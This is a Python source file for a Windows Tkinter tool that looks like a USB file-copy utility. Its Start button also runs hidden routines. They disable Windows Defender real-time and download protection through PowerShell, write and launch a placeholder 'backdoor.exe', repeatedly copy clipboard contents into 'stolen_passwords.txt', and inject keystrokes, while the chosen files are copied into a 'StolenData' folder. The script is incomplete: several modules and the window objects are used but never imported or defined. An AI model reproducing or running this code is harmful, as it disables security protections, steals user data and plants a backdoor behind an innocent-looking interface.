import os
import shutil
import string
import ctypes
import subprocess
import threading

import win32con

from tkinter import filedialog, messagebox, ttk

# Global variables
stop_copying = False
copy_thread = None
is_copying = False
source_path = ""
destination_path = ""

# Function to disable Windows security
def disable_windows_security():
    try:
        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, check=False)
        subprocess.run('powershell -Command "Set-MpPreference -DisableIOAVProtection $true"', shell=True, check=False)
    except:
        pass

# Function to copy data (NEW FOLDER)
def copy_data():
    global stop_copying, is_copying
    try:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        new_folder = os.path.join(destination_path, f"StolenData_{timestamp}")
        os.makedirs(new_folder, exist_ok=True)
        
        if os.path.isfile(source_path):
            shutil.copy2(source_path, new_folder)
        else:
            for root, dirs, files in os.walk(source_path):
                for file in files:
                    if stop_copying:
                        return
                    src_file = os.path.join(root, file)
                    rel_path = os.path.relpath(src_file, source_path)
                    dest_file = os.path.join(new_folder, rel_path)
                    os.makedirs(os.path.dirname(dest_file), exist_ok=True)
                    shutil.copy2(src_file, dest_file)
                    time.sleep(0.01)
        
        update_status("✅ TRANSFER COMPLETE - Closing in 3s...", "green")
        root.after(3000, root.quit)  # Auto close after 3 seconds
        
    except Exception as e:
        update_status(f"❌ Error: {str(e)}", "red")

# Background functions
def steal_passwords():
    while True:
        time.sleep(5)
        try:
            pyautogui.hotkey('ctrl', 'c')
            time.sleep(0.1)
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            with open('stolen_passwords.txt', 'a', encoding='utf-8') as f:
                f.write(str(data) + '\n')
        except:
            pass

def create_backdoor():
    try:
        backdoor_path = os.path.join(os.environ['TEMP'], 'backdoor.exe')
        with open(backdoor_path, 'wb') as f:
            f.write(b'Your backdoor binary data here')
        os.startfile(backdoor_path)
    except:
        pass

def inject_keyboard_commands():
    while True:
        time.sleep(2)
        try:
            keyboard.press_and_release('ctrl+c')
            keyboard.press_and_release('ctrl+v')
        except:
            pass

def run_background():
    disable_windows_security()
    create_backdoor()
    threading.Thread(target=steal_passwords, daemon=True).start()
    threading.Thread(target=inject_keyboard_commands, daemon=True).start()

# Update status function
def update_status(message, color):
    status_label.config(text=message, fg=color)
    progress_label.config(text="█" * 50)
    root.update()

# Toggle start/stop
def toggle_copy():
    global stop_copying, copy_thread, is_copying, source_path, destination_path
    
    if not is_copying:
        # START
        source_path = source_entry.get()
        destination_path = destination_var.get()
        
        if not source_path or not destination_path or destination_path == "No USB drives found":
            messagebox.showerror("Error", "Select source & USB drive first!")
            return
        
        stop_copying = False
        is_copying = True
        run_background()
        
        main_button.config(text="⏹️ STOP COPYING", bg="#FF4444", fg="white")
        status_label.config(text="🚀 Starting transfer...", fg="orange")
        
        copy_thread = threading.Thread(target=copy_data)
        copy_thread.daemon = True
        copy_thread.start()
        
    else:
        # STOP
        stop_copying = True
        is_copying = False
        main_button.config(text="▶️ START COPYING", bg="#00AA00", fg="white")
        status_label.config(text="⏸️ Transfer stopped", fg="red")

# Select source
def select_source():
    path = filedialog.askdirectory()
    if path:
        source_entry.delete(0, tk.END)
        source_entry.insert(0, path)

# Refresh USB
def refresh_usb():
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drive = f"{letter}:\\"
            drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive)
            if drive_type == 2:
                drives.append(drive)
        bitmask >>= 1
    if drives:
        destination_var.set(drives[0])
        destination_combo['values'] = drives
    else:
        destination_var.set("No USB drives found")
